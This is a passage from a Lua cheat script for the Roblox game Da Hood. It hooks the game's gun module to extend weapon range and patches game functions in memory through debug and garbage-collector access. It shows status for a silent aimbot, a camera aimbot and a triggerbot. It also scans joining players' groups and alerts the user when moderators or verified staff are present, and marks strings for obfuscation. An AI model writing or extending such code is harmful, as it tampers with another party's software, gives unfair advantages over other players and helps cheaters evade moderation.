    -- initial + continuous sync (cheap)
    SyncRangeTools()
    local lastSync = 0
    RunService.Heartbeat:Connect(function()
        local now = os.clock()
        if now - lastSync < 0.75 then return end
        lastSync = now
        SyncRangeTools()
    end)

    LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(0.8)
        SyncRangeTools()
        char.ChildAdded:Connect(function(v)
            if v:IsA('Tool') then
                task.defer(function() ApplyRangeToTool(v) end)
            end
        end)
    end)

    if LocalPlayer.Character then
        LocalPlayer.Character.ChildAdded:Connect(function(v)
            if v:IsA('Tool') then task.defer(function() ApplyRangeToTool(v) end) end
        end)
    end

    local bp = LocalPlayer:FindFirstChild('Backpack')
    if bp then
        bp.ChildAdded:Connect(function(v)
            if v:IsA('Tool') then task.defer(function() ApplyRangeToTool(v) end) end
        end)
    end

    -- ── GunHandler hook (shoot + getAim) ──────────────────────────
    task.spawn(function()
        local ModulesFolder = ReplicatedStorage:FindFirstChild('Modules') or ReplicatedStorage:WaitForChild('Modules', 8)
        if not ModulesFolder then return end
        local ok, GunModule = pcall(function() return ModulesFolder:WaitForChild('GunHandler', 8) end)
        if not ok or not GunModule then return end
        local okR, GunHandler = pcall(require, GunModule)
        if not okR or type(GunHandler) ~= 'table' then return end

        if type(GunHandler.shoot) == 'function' and not GunHandler.__RangeWrapped then
            local origShoot = GunHandler.shoot
            GunHandler.shoot = function(args)
                local CurrentCfg = GetRangeCfg()
                local EnhVal = (CurrentCfg and CurrentCfg['Enabled'] and tonumber(CurrentCfg['Value'])) or 0
                if type(args) == 'table' then
                    if args.Range then args.Range = args.Range + EnhVal end
                    if args.range then args.range = args.range + EnhVal end
                    if args.MaxRange then args.MaxRange = args.MaxRange + EnhVal end
                end
                return origShoot(args)
            end
            GunHandler.__RangeWrapped = true
        end

        if type(GunHandler.getAim) == 'function' and not GunHandler.__RangeAimWrapped then
            local origGetAim = GunHandler.getAim
            GunHandler.getAim = function(hit, dist)
                local CurrentCfg = GetRangeCfg()
                local EnhVal = (CurrentCfg and CurrentCfg['Enabled'] and tonumber(CurrentCfg['Value'])) or 0
                return origGetAim(hit, (dist or 0) + EnhVal)
            end
            GunHandler.__RangeAimWrapped = true
        end
    end)

    -- ── Advanced: bytecode patch (best-effort, non-fatal) ─────────
    -- Hash breaks on game updates. Wrapped in pcall so it never kills the rest.
    if RangeCfg['Advanced'] and getgc and islclosure and debug then
        task.spawn(function()
            local EnhVal = tonumber(GetRangeCfg()['Value']) or 12
            local targetHash = 'f01a12bbf0fe1944cdca10883eb444581d9a6bbd8f40472dbf23b6b39fd412f21769d9bfccef6b899f802bae846d2bb3'
            pcall(function()
                for _, obj in getgc(true) do
                    if type(obj) == 'function' and islclosure(obj) then
                        local okH, hash = pcall(getfunctionhash, obj)
                        if okH and hash == targetHash then
                            pcall(function()
                                local uv = debug.getupvalue(obj, 10)
                                if uv and type(uv) == 'table' and uv.Value ~= nil then
                                    uv.Value = EnhVal
                                elseif type(uv) == 'number' then
                                    debug.setupvalue(obj, 10, EnhVal)
                                end
                            end)
                            pcall(debug.setupvalue, obj, 2, 0)
                            pcall(debug.setconstant, obj, 26, 0)
                            pcall(debug.setconstant, obj, 27, 0)
                        end
                    end
                end
            end)
        end)
    end
end)
--=================================================================
-- END Range Extender
--=================================================================
--=================================================================
-- INVENTORY SORTER
--=================================================================
task.spawn(function()
    local Players   = game:GetService("Players")
    local UserInput = game:GetService("UserInputService")
    local Workspace = game.Workspace

    local LocalPlayer = Players.LocalPlayer

    local function GetCfg()
        return getgenv()['Platinun']['Weapon Modifications']['Inventory Sorter']
    end

    local function GetSorterKey()
        local key = getgenv()['Platinun']['General']['Keybind List']['Inventory Sorter']
        if not key then return nil end
        local ok, kc = pcall(function() return Enum.KeyCode[key:upper()] end)
        if ok then return kc end
        return nil
    end

    local SortRunning = false

    local function RunSorter()
        if SortRunning then return end
        local Cfg = GetCfg()
        if not Cfg or not Cfg['Enabled'] then return end

        local Character = LocalPlayer.Character
        if not Character then return end
        local Backpack = LocalPlayer:FindFirstChildOfClass('Backpack')
        if not Backpack then return end

        SortRunning = true

        local GunOrder = Cfg['Order'] or {}
        local OrderV = math.max(10 - #GunOrder, 0)

        local FakeFolder = Instance.new('Folder')
        FakeFolder.Name = 'SorterTemp'
        FakeFolder.Parent = Workspace

        for _, v in next, Backpack:GetChildren() do
            if v:IsA('Tool') then v.Parent = FakeFolder end
        end

        for _, Name in next, GunOrder do
            local Gun = FakeFolder:FindFirstChild(Name)
            if Gun then
                Gun.Parent = Backpack
                task.wait(0.05)
            else
                OrderV = OrderV + 1
            end
        end

        for _, v in next, FakeFolder:GetChildren() do
            if v:FindFirstChild('Drink') or v:FindFirstChild('Eat') then
                v.Parent = Backpack
                OrderV = OrderV - 1
            end
        end

        if OrderV > 0 then
            for _ = 1, OrderV do
                local PlaceHolder = Instance.new('Tool')
                PlaceHolder.Name = ''
                PlaceHolder.ToolTip = 'PlaceHolder'
                PlaceHolder.GripPos = Vector3.new(0, 1, 0)
                PlaceHolder.RequiresHandle = false
                PlaceHolder.Parent = Backpack
            end
        end

        for _, v in next, FakeFolder:GetChildren() do
            if v:IsA('Tool') then v.Parent = Backpack end
        end

        for _, v in next, Backpack:GetChildren() do
            if v.Name == '' then v:Destroy() end
        end

        FakeFolder:Destroy()
        task.wait(0.5)
        SortRunning = false
    end

    local sorterKey = GetSorterKey()
    if not sorterKey then
        warn('[Sorter] no keybind configured, sorter inactive')
        return
    end

    UserInput.InputBegan:Connect(function(Input, Processed)
        if Processed then return end
        if Input.KeyCode ~= sorterKey then return end
        local Cfg = GetCfg()
        if not Cfg or not Cfg['Enabled'] then return end
        task.spawn(RunSorter)
    end)
end)
--=================================================================
-- END INVENTORY SORTER
--=================================================================
do
    local Players      = game:GetService("Players")
    local GroupService = game:GetService("GroupService")
    local LocalPlayer  = Players.LocalPlayer

    local FLAGGED_GROUPS = {
        [10604500]  = "Da Hood Verified",
        [8068202]  = "Da Hood Stars",
        [17215700] = "Related to Moderators"
 
    }

    local function SafeModeOn()
        local s = getgenv()
        return s and s['Platinun'] and s['Platinun']['Safe Mode'] == true
    end

    local function Alert(player, groupInfo, label)
        local msg = string.format(
            "[Platinun Automated Handler] %s (%d) is in %s (Rank %d) — %s",
            player.Name, player.UserId, groupInfo.Name, groupInfo.Rank, label
        )
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "High Rank Detected.",
                Text  = msg,
                Duration = 3,
            })
        end)
        pcall(function()
            game:GetService("TextChatService"):DisplaySystemMessage(msg)
        end)
    end

    local function CheckPlayer(player)
        if not SafeModeOn() then return end
        local ok, groups = pcall(function()
            return GroupService:GetGroupsAsync(player.UserId)
        end)
        if not ok or not groups then return end
        for _, g in ipairs(groups) do
            local label = FLAGGED_GROUPS[g.Id]
            if label then
                Alert(player, g, label)
                break
            end
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do CheckPlayer(plr) end
    Players.PlayerAdded:Connect(CheckPlayer)
end

--=================================================================
-- WEAPON DELAY CHANGER (legacy; kept in sync with config)
--=================================================================
do
    -- Nothing extra needed here; the main script handles delay via Script:ApplyGunDelay
end

local Script = { RBXConnections = {}, Locals = {}, Visuals = {} }

local WeaponMap = {}
local Velocity_Data = {
    Tick = tick(), Sample = nil, State = Enum.HumanoidStateType.Running, Y = nil,
    Recorded = { Alpha = nil, B_0 = nil, V_T = nil, V_B = nil }
}

local aliases = {
    ["[Double-Barrel SG]"] = {"db", "double barrel", "double-barrel", "dbl sg", "double sg", "db sg"},
    ["[TacticalShotgun]"] = {"tac", "tac sg", "tactical shotgun", "tactical sg", "tacshot", "tactical"},
    ["[Drum-Shotgun]"] = {"drum sg", "drum shotgun", "auto sg", "drum auto", "drum"},
    ["[Shotgun]"] = {"sg", "shotgun", "pump", "pump sg", "pump shotgun", "buckshot"},
    ["[Revolver]"] = {"rev", "revolver", "six shooter", "wheel gun", "colt", "magnum"},
    ["[Silencer]"] = {"silencer", "suppressed", "supp pistol", "silenced pistol", "quiet gun"},
    ["[Glock]"] = {"glock", "g17", "glock 17", "pistol", "semi", "9mm"},
    ["[Rifle]"] = {"rifle", "ar", "assault rifle", "m4", "m4a1", "m16"},
    ["[AUG]"] = {"aug", "steyr aug", "bullpup", "aug rifle"},
    ["[AR]"] = {"ar", "assault rifle", "m4", "m4a1", "rifle"},
    ["[SMG]"] = {"smg", "submachine gun", "uzi", "mp5", "mp7", "vector"},
    ["[LMG]"] = {"lmg", "light machine gun", "m249", "saw", "negev"},
    ["[P90]"] = {"p90", "fn p90", "pdw", "personal defense weapon"},
    ["[AK47]"] = {"ak", "ak47", "kalashnikov", "akm", "russian rifle"},
    ["[SilencerAR]"] = {"silencer ar", "suppressed ar", "silenced rifle", "quiet ar"},
    ["[DrumGun]"] = {"drum gun", "tommy gun", "thompson", "drum ar", "drum rifle"}
}
for weapon, names in pairs(aliases) do
    for _, alias in ipairs(names) do WeaponMap[alias] = weapon end
end

local Modules = { Cache = {} }
function Modules.Get(Id)
    if not Modules.Cache[Id] then Modules.Cache[Id] = { c = Modules[Id]() } end
    return Modules.Cache[Id].c
end

local function InitializeLocals()
    local defaults = {
        LPH_ENCSTR("GunScriptDisabled"), LPH_ENCSTR("SilentAimTarget"),
        LPH_ENCSTR("AimAssistTarget"), LPH_ENCSTR("IsWalkSpeeding"), LPH_ENCSTR("CurrentWeapon"),
        LPH_ENCSTR("IsBoxFocused"), LPH_ENCSTR("HitPosition"), LPH_ENCSTR("MoveVector"), LPH_ENCSTR("LastShot"),
        LPH_ENCSTR("IsAimed"), LPH_ENCSTR("HitPart"), LPH_ENCSTR("CodeRegion"), LPH_ENCSTR("FieldOfViewOne"),
        LPH_ENCSTR("FieldOfViewTwo"), LPH_ENCSTR("TriggerState"), LPH_ENCSTR("LastTriggerShot"),
        LPH_ENCSTR("TriggerbotTarget")
    }
    for _, v in ipairs(defaults) do Script.Locals[v] = nil end
    Script.Locals.LastShot = 0
    Script.Locals.CodeRegion = "Initialization"
    Script.Locals.HitPosition = Vector3.new()
    Script.Locals.IsWalkSpeeding = false
    Script.Locals.LastTriggerShot = 0
    Script.Locals.TriggerState = false
    Script.Locals.TriggerbotTarget = nil
    Script.Locals.LastHealth = 100

    local _ws = getgenv()['Platinun'] and getgenv()['Platinun']['Player Modifications']['Walk Speed']
Script.Locals.IsWalkSpeeding = (_ws and _ws['Enabled']) == true
end

local function SetRegion(Region) Script.Locals.CodeRegion = Region end
local function GetRegion() return Script.Locals.CodeRegion end

InitializeLocals()

do
    SetRegion("Status Display")
    local showStatus = getgenv()['Platinun']['General']['Show Hotkeys']['Enabled']

    Script.Locals.SP  = Script.Locals.SP  or false
    Script.Locals.SP2 = Script.Locals.SP2 or false
    Script.Locals.SP3 = Script.Locals.SP3 or false
    Script.Locals.TriggerState = Script.Locals.TriggerState or false

    local StatusGui = Instance.new("ScreenGui")
    StatusGui.Name = "PlatinunStatusGui"
    StatusGui.IgnoreGuiInset = true
    StatusGui.ResetOnSpawn = false
    StatusGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() StatusGui.Parent = game:GetService("CoreGui") end)
    if not StatusGui.Parent then
        StatusGui.Parent = Self:WaitForChild("PlayerGui")
    end

    local function CreatePanelLabel(size, font)
        local lbl = Instance.new("TextLabel")
        lbl.BackgroundTransparency = 1
        lbl.RichText = true
        lbl.Font = Enum.Font.SourceSansSemibold
        lbl.TextSize = size or 13
        lbl.TextColor3 = Color3.new(1, 1, 1)
        lbl.TextStrokeTransparency = 0
        lbl.TextStrokeColor3 = Color3.new(0, 0, 0)
        lbl.AnchorPoint = Vector2.new(0.5, 0.5)
        lbl.Size = UDim2.new(0, 400, 0, size + 4)
        lbl.Visible = false
        lbl.Parent = StatusGui
        return lbl
    end

    local PanelTitle = CreatePanelLabel(15, Enum.Font.GothamBold)
    PanelTitle.Text = '<font color="rgb(255, 255, 255)">platinun.</font><font color="rgb(255, 182, 193)">wtf</font>'

    local PanelLabels = {}
    for i = 1, 10 do
        PanelLabels[i] = CreatePanelLabel(13, Enum.Font.SourceSansBold)
    end

    local FeatureColor = Color3.fromRGB(255, 255, 255)
    local TargetColor  = Color3.fromRGB(255, 182, 193)

    local function rgbStr(c)
        return string.format("%d, %d, %d",
            math.floor(c.R * 255 + 0.5),
            math.floor(c.G * 255 + 0.5),
            math.floor(c.B * 255 + 0.5))
    end

    local function BuildLine(featureText, targetText)
        if targetText ~= nil and targetText ~= "" then
            return string.format(
                '<font color="rgb(%s)">%s</font> <font color="rgb(255, 255, 255)">=</font> <font color="rgb(%s)">%s</font>',
                rgbStr(FeatureColor), featureText,
                rgbStr(TargetColor), targetText
            )
        end
        return string.format('<font color="rgb(%s)">%s</font>', rgbStr(FeatureColor), featureText)
    end

    local BASE_Y_OFFSET = -126
    local LINE_HEIGHT   = 16
    local TITLE_GAP     = 18

    function Script:UpdateStatusUI()
        local ok, err = pcall(function()
            local rootCfg = getgenv()['Platinun']
            if not rootCfg then return end
            local generalCfg = rootCfg['General']
            if not generalCfg then return end
            local showCfg = generalCfg['Show Hotkeys']
            if not showCfg then return end

            if not showCfg['Enabled'] then
                PanelTitle.Visible = false
                for _, l in ipairs(PanelLabels) do l.Visible = false end
                return
            end

            -- ── Health/Armor mode resolution ──
            -- 'ESP'     -> status panel does NOT show HP/armor (ESP handles it)
            -- 'Hotkeys' -> status panel DOES show HP/armor
            -- 'Both'    -> status panel DOES show HP/armor (ESP also shows it)
            local haMode = tostring(showCfg['Health/Armor'] or 'Both')
            local showHPInPanel = (haMode == 'Hotkeys' or haMode == 'Both')

            local vp = Camera.ViewportSize
            local centerX = vp.X / 2

            local silentCfgOn  = rootCfg['Silent Aimbot'] and rootCfg['Silent Aimbot']['Enabled'] == true
            local triggerCfgOn = rootCfg['Triggerbot'] and rootCfg['Triggerbot']['Enabled'] == true
            local assistCfgOn  = rootCfg['Camera Aimbot'] and rootCfg['Camera Aimbot']['Enabled'] == true

            local silentOn  = silentCfgOn  and Script.Locals.SP == true
            local assistOn  = assistCfgOn  and Script.Locals.SP2 == true
            local triggerOn = triggerCfgOn and Script.Locals.TriggerState == true

            local silentTarget  = Script.Locals.SilentAimTarget
            local triggerTarget = Script.Locals.TriggerbotTarget
            local assistTarget  = Script.Locals.AimAssistTarget

            local primaryTarget = silentTarget or triggerTarget or assistTarget

            local targetName = "none"
            local health = nil
            local armor = nil

            if primaryTarget then
                targetName = primaryTarget.DisplayName or primaryTarget.Name

                if showHPInPanel then
                    local char = primaryTarget.Character
                    if char then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            health = math.floor(hum.Health + 0.5)
                        end
                        local be = char:FindFirstChild("BodyEffects")
                        if be then
                            local ar = be:FindFirstChild("Armor")
                            if ar then armor = math.floor(ar.Value + 0.5) end
                        end
                    end
                end
            end

            local targetStr = tostring(targetName)
            if health then
                local hpCol = health > 50 and "88, 220, 88"
                    or (health > 20 and "230, 220, 70" or "220, 55, 55")
                targetStr = targetStr
                    .. ' <font color="rgb(255, 255, 255)">|</font> '
                    .. string.format('<font color="rgb(%s)">%d</font>', hpCol, health)
            end
            if armor then
                local armCol = "170, 190, 210"
                targetStr = targetStr
                    .. ' <font color="rgb(255, 255, 255)">/</font> '
                    .. string.format('<font color="rgb(%s)">%d</font>', armCol, armor)
            end

            local lines = {}

            -- ===== CUSTOM TEXT (below title, above target) =====
            local rawCustom = showCfg['Custom Text']
            if rawCustom ~= nil then
                local customText = tostring(rawCustom)
                if customText ~= "" and customText ~= "nil" then
                    local ctColor = showCfg['Custom Text Color']
                    if typeof(ctColor) ~= "Color3" then
                        ctColor = Color3.fromRGB(255, 255, 255)
                    end
                    lines[#lines + 1] = string.format(
                        '<font color="rgb(%s)">%s</font>',
                        rgbStr(ctColor),
                        customText
                    )
                end
            end
            -- ===== END CUSTOM TEXT =====

            lines[#lines + 1] = BuildLine("target", targetStr)

            if assistOn then
                lines[#lines + 1] = BuildLine("camera aimbot", nil)
            end

            if silentOn then
                lines[#lines + 1] = BuildLine("silent aimbot", nil)
            end

            if triggerOn then
                lines[#lines + 1] = BuildLine("triggerbot", nil)
            end

            local totalHeight = TITLE_GAP + #lines * LINE_HEIGHT
            local baseY = vp.Y + BASE_Y_OFFSET - totalHeight + TITLE_GAP

            PanelTitle.Position = UDim2.fromOffset(centerX, baseY)
            PanelTitle.Visible = true

            for i = 1, #PanelLabels do
                local lbl = PanelLabels[i]
                if lines[i] then
                    lbl.Text = lines[i]
                    lbl.Position = UDim2.fromOffset(centerX, baseY + TITLE_GAP + (i - 1) * LINE_HEIGHT)
                    lbl.Visible = true
                else
                    lbl.Visible = false
                end
            end
        end)
        if not ok then
            warn("[Platinun Automated Handler] error:", err)
        end
    end

    Script:UpdateStatusUI()
end
local WeaponInfo = {
    Shotguns = {"[TacticalShotgun]", "[Shotgun]", "[Double-Barrel SG]"},
    AutoShotguns = {"[Drum-Shotgun]"},
    Pistols = {"[Revolver]", "[Silencer]", "[Glock]"},
    Rifles = {"[AR]", "[SilencerAR]", "[AK47]", "[LMG]", "[DrumGun]"},
    Bursts = {"[AUG]"},
    SMG = {"[SMG]", "[P90]"},
    Snipers = {"[Rifle]"},
    Offsets = {
        ["[Double-Barrel SG]"] = CFrame.new(0, 0.35, -2.2),
        ["[TacticalShotgun]"] = CFrame.new(0, 0.25, -2.5),
        ["[Drum-Shotgun]"] = CFrame.new(-0.1, 0.5, -2.5),
        ["[Shotgun]"] = CFrame.new(0, 0.25, -2.5),
        ["[Revolver]"] = CFrame.new(-1, 0.4, 0),
        ["[Silencer]"] = CFrame.new(0, 0.4, 1.3),
        ["[Glock]"] = CFrame.new(0.6, 0.25, 0),
        ["[Rifle]"] = CFrame.new(0, 0.25, 2.5),
        ["[AUG]"] = CFrame.new(-0.1, 0.4, 1.8),
        ["[AR]"] = CFrame.new(2, 0.35, 0),
        ["[SMG]"] = CFrame.new(0, 1, 0.5),
        ["[LMG]"] = CFrame.new(0, 0.7, -3.8),
        ["[P90]"] = CFrame.new(0, 0.2, -1.7),
        ["[AK47]"] = CFrame.new(-0.1, 0.5, -2.5),
        ["[SilencerAR]"] = CFrame.new(2.5, 0.35, 0),
        ["[DrumGun]"] = CFrame.new(0, 0.4, 2.4)
    },
    Delays = {
        ["[Double-Barrel SG]"] = 0.0, ["[TacticalShotgun]"] = 0.0, ["[Drum-Shotgun]"] = 0.415,
        ["[Shotgun]"] = 1.2, ["[Revolver]"] = 0.0, ["[Silencer]"] = 0.0095, ["[Glock]"] = 0.0095,
        ["[Rifle]"] = 1.3095, ["[AUG]"] = 0.0095, ["[AR]"] = 0.15, ["[SMG]"] = 0.6,
        ["[LMG]"] = 0.62, ["[P90]"] = 0.6, ["[AK47]"] = 0.15, ["[SilencerAR]"] = 0.02
    }
}

local CurrentFOV, CurrentFOVX, CurrentFOVY = 0, 0, 0
local SilentAimPart = Instance.new("Part"); SilentAimPart.Name = math.random(1, 99999999)
local silentRayParams = RaycastParams.new()
silentRayParams.FilterType = Enum.RaycastFilterType.Whitelist
silentRayParams.FilterDescendantsInstances = { SilentAimPart }

local function raycastSilent(origin, direction)
    local result = workspace:Raycast(origin, direction, silentRayParams)

    if result and result.Instance then
        if result.Instance ~= SilentAimPart then
            local nextOrigin = result.Position + direction.Unit * 0.1
            return raycastSilent(nextOrigin, direction)
        end
        return result
    end

    return nil
end
local TriggerPart = Instance.new("Part"); TriggerPart.Name = math.random(1, 99999999)
local CanTriggerbotShoot = true

local function GameFunctions()
    SetRegion("Game Functions")
    return {
        IsKnocked = function(Player)
            if not Player then return false end
            -- Accept either a Player or a Character
            local char = Player
            if typeof(Player) == "Instance" and Player:IsA("Player") then
                char = Player.Character
            end
            if not char or not char.Parent then return false end
            local BodyEffects = char:FindFirstChild('BodyEffects')
            if not BodyEffects then return false end
            local KO = BodyEffects:FindFirstChild('K.O')
            if not KO then return false end
            -- guard against non-ValueBase in case game reshapes it
            local ok, val = pcall(function() return KO.Value end)
            return ok and val == true
        end,
        IsGrabbed = function(Player)
            if not Player then return false end
            local char = Player
            if typeof(Player) == "Instance" and Player:IsA("Player") then
                char = Player.Character
            end
            if not char or not char.Parent then return false end
            return char:FindFirstChild('GRABBING_CONSTRAINT') ~= nil
        end,
    }
end

local Games = { [LPH_ENCSTR('Da Hood')] = { HoodGame = true, Functions = GameFunctions() },
                [LPH_ENCSTR('a literal baseplate.')] = { HoodGame = false, Functions = GameFunctions() },
                [LPH_ENCSTR('Universal')] = { HoodGame = false, Functions = GameFunctions() }
            }

local MarketplaceService = game:GetService("MarketplaceService")
local Success, Info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
local GameName = Success and Info.Name or "Universal"
local Match
for Index in pairs(Games) do if string.match(GameName, Index) then Match = Index; break end end
local CurrentGame = Games[Match] or Games.Universal

SetRegion("Threading")

local function ThreadLoop(Wait, Func)
    task.spawn(function()
        while true do
            local Delta = task.wait(Wait)
            local Success, Result = pcall(Func, Delta)
            if not Success then warn("Thread error:", Result)
            elseif Result == "break" then break end
        end
    end)
end

local function ThreadFunction(Func, Name, ...)
    local WrappedFunc = Name and function()
        local Passed, Statement = pcall(Func)
        if not Passed then warn('ThreadFunction Error:\n', '              ' .. Name .. ':', Statement) end
    end or Func
    local Thread = coroutine.create(WrappedFunc)
    coroutine.resume(Thread, ...)
    return Thread
end

local function RBXConnection(Signal, Callback)
    local connection = Signal:Connect(Callback)
    Script.RBXConnections[#Script.RBXConnections + 1] = connection
    return connection
end

do
    SetRegion("Drawing")
    local CustomLibIndex = 0
    local UtilityUI = Instance.new('ScreenGui'); UtilityUI.Parent = game:GetService("CoreGui"); UtilityUI.IgnoreGuiInset = true
    local UserInputService = game:GetService("UserInputService")
    local Clamp = math.clamp
    local Atan2 = math.atan2
    local Deg = math.deg
    local LibraryMeta = setmetatable({
        Visible = true, ZIndex = 0, Transparency = 1, Color = Color3.new(),
        Remove = function(self) setmetatable(self, nil) end,
        Destroy = function(self) setmetatable(self, nil) end
    }, { __add = function(t1, t2)
        local result = table.clone(t1)
        for index, value in t2 do result[index] = value end
        return result
    end })
    local function ClampTransparency(number) return Clamp(1 - number, 0, 1) end
    function Script.Visuals.new(ClassType)
        CustomLibIndex += 1
        if ClassType == 'Line' then
            local LineObject = ({ From = Vector2.zero, To = Vector2.zero, Thickness = 1 } + LibraryMeta)
            local Line = Instance.new('Frame')
            Line.Name = CustomLibIndex; Line.AnchorPoint = (Vector2.one * .5); Line.BorderSizePixel = 0
            Line.BackgroundColor3 = LineObject.Color; Line.Visible = LineObject.Visible; Line.ZIndex = LineObject.ZIndex
            Line.BackgroundTransparency = ClampTransparency(LineObject.Transparency); Line.Size = UDim2.new(); Line.Parent = UtilityUI
            return setmetatable(table.create(0), {
                __newindex = function(_, Property, Value)
                    if Property == 'From' then
                        local D = (LineObject.To - Value); local C = (LineObject.To + Value) / 2
                        local M = D.Magnitude; local T = Deg(Atan2(D.Y, D.X))
                        Line.Position = UDim2.fromOffset(C.X, C.Y); Line.Rotation = T
                        Line.Size = UDim2.fromOffset(M, LineObject.Thickness)
                    elseif Property == 'To' then
                        local D = (Value - LineObject.From); local C = (Value + LineObject.From) / 2
                        local M = D.Magnitude; local T = Deg(Atan2(D.Y, D.X))
                        Line.Position = UDim2.fromOffset(C.X, C.Y); Line.Rotation = T
                        Line.Size = UDim2.fromOffset(M, LineObject.Thickness)
                    elseif Property == 'Thickness' then
                        local T = (LineObject.To - LineObject.From).Magnitude
                        Line.Size = UDim2.fromOffset(T, Value)
                    elseif Property == 'Visible' then Line.Visible = Value
                    elseif Property == 'ZIndex' then Line.ZIndex = Value
                    elseif Property == 'Transparency' then Line.BackgroundTransparency = ClampTransparency(Value)
                    elseif Property == 'Color' then Line.BackgroundColor3 = Value end
                    LineObject[Property] = Value
                end,
                __index = function(self, index)
                    if index == 'Remove' or index == 'Destroy' then
                        return function() Line:Destroy(); LineObject.Remove(self); return LineObject:Remove() end
                    end
                    return LineObject[index]
                end,
                __tostring = function() return 'CustomLib' end
            })
        elseif ClassType == 'Circle' then
            local circleObj = ({ Radius = 150, Position = Vector2.zero, Thickness = .7, Filled = false } + LibraryMeta)
            local circleFrame, uiCorner, uiStroke = Instance.new('Frame'), Instance.new('UICorner'), Instance.new('UIStroke')
            circleFrame.Name = CustomLibIndex; circleFrame.AnchorPoint = (Vector2.one * .5); circleFrame.BorderSizePixel = 0
            circleFrame.BackgroundTransparency = (circleObj.Filled and ClampTransparency(circleObj.Transparency) or 1)
            circleFrame.BackgroundColor3 = circleObj.Color; circleFrame.Visible = circleObj.Visible; circleFrame.ZIndex = circleObj.ZIndex
            uiCorner.CornerRadius = UDim.new(1, 0); circleFrame.Size = UDim2.fromOffset(circleObj.Radius, circleObj.Radius)
            uiStroke.Thickness = circleObj.Thickness; uiStroke.Enabled = not circleObj.Filled; uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            circleFrame.Parent, uiCorner.Parent, uiStroke.Parent = UtilityUI, circleFrame, circleFrame
            return setmetatable(table.create(0), {
                __newindex = function(_, index, value)
                    if typeof(circleObj[index]) == 'nil' then return end
                    if index == 'Radius' then local r = value * 2; circleFrame.Size = UDim2.fromOffset(r, r)
                    elseif index == 'Position' then circleFrame.Position = UDim2.fromOffset(value.X, value.Y)
                    elseif index == 'Thickness' then value = Clamp(value, .6, 0x7fffffff); uiStroke.Thickness = value
                    elseif index == 'Filled' then
                        circleFrame.BackgroundTransparency = (circleObj.Filled and ClampTransparency(circleObj.Transparency) or 1)
                        uiStroke.Enabled = not value
                    elseif index == 'Visible' then circleFrame.Visible = value
                    elseif index == 'ZIndex' then circleFrame.ZIndex = value
                    elseif index == 'Transparency' then
                        local t = ClampTransparency(value)
                        circleFrame.BackgroundTransparency = (circleObj.Filled and t or 1)
                        uiStroke.Transparency = t
                    elseif index == 'Color' then circleFrame.BackgroundColor3 = value; uiStroke.Color = value end
                    circleObj[index] = value
                end,
                __index = function(self, index)
                    if index == 'Remove' or index == 'Destroy' then
                        return function() circleFrame:Destroy(); circleObj.Remove(self); return circleObj:Remove() end
                    end
                    return circleObj[index]
                end,
                __tostring = function() return 'CustomLib' end
            })
        elseif ClassType == 'Square' then
            local squareObj = ({ Size = Vector2.zero, Position = Vector2.zero, Thickness = .7, Filled = false, Drag = false } + LibraryMeta)
            local squareFrame, uiStroke = Instance.new('Frame'), Instance.new('UIStroke')
            squareFrame.Name = CustomLibIndex; squareFrame.BorderSizePixel = 0
            local t = squareObj.Filled and ClampTransparency(squareObj.Transparency) or 1
            squareFrame.BackgroundTransparency = t; squareFrame.ZIndex = squareObj.ZIndex
            squareFrame.BackgroundColor3 = squareObj.Color; squareFrame.Visible = squareObj.Visible
            uiStroke.Thickness = squareObj.Thickness; uiStroke.Enabled = not squareObj.Filled; uiStroke.LineJoinMode = Enum.LineJoinMode.Miter
            squareFrame.Parent, uiStroke.Parent = UtilityUI, squareFrame
            local dragging = false; local dragStart = nil; local startPos = nil
            squareFrame.MouseEnter:Connect(function()
                if squareObj.Drag then
                    local inputConnection
                    inputConnection = UserInputService.InputBegan:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true; dragStart = input.Position; startPos = squareFrame.Position end
                    end)
                    local leaveConnection
                    leaveConnection = squareFrame.MouseLeave:Connect(function() inputConnection:Disconnect(); leaveConnection:Disconnect() end)
                end
            end)
            UserInputService.InputChanged:Connect(function(input)
                if squareObj.Drag and dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                    local delta = input.Position - dragStart
                    squareFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end)
            UserInputService.InputEnded:Connect(function(input)
                if squareObj.Drag and input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
            end)
            return setmetatable(table.create(0), {
                __newindex = function(_, index, value)
                    if typeof(squareObj[index]) == 'nil' then return end
                    if index == 'Size' then squareFrame.Size = UDim2.fromOffset(value.X, value.Y)
                    elseif index == 'Position' then squareFrame.Position = UDim2.fromOffset(value.X, value.Y)
                    elseif index == 'Thickness' then value = Clamp(value, 0.6, 0x7fffffff); uiStroke.Thickness = value
                    elseif index == 'Visible' then squareFrame.Visible = value
                    elseif index == 'Transparency' then squareFrame.BackgroundTransparency = 1; uiStroke.Transparency = ClampTransparency(value)
                    elseif index == 'Color' then uiStroke.Color = value; squareFrame.BackgroundColor3 = value end
                    squareObj[index] = value
                end,
                __index = function(self, index)
                    if index == 'Remove' or index == 'Destroy' then
                        return function() squareFrame:Destroy(); squareObj.Remove(self); return squareObj:Remove() end
                    end
                    return squareObj[index]
                end,
                __tostring = function() return 'CustomLib' end
            })
        elseif ClassType == 'Text' then
            local textObj = ({
                Text = '', Font = Enum.Font.SourceSansBold, Size = 0, Position = Vector2.zero,
                Center = false, Outline = false, OutlineColor = Color3.new()
            } + LibraryMeta)
            local textLabel, uiStroke = Instance.new('TextLabel'), Instance.new('UIStroke')
            textLabel.Name = CustomLibIndex; textLabel.AnchorPoint = (Vector2.one * .5); textLabel.BorderSizePixel = 0
            textLabel.BackgroundTransparency = 1; textLabel.RichText = true
            textLabel.Visible = textObj.Visible; textLabel.TextColor3 = textObj.Color
            textLabel.TextTransparency = ClampTransparency(textObj.Transparency); textLabel.ZIndex = textObj.ZIndex
            textLabel.Font = Enum.Font.SourceSansBold; textLabel.TextSize = textObj.Size
            textLabel:GetPropertyChangedSignal('TextBounds'):Connect(function()
                local b = textLabel.TextBounds; local o = b / 2
                local ox = textObj.Center and 0 or o.X
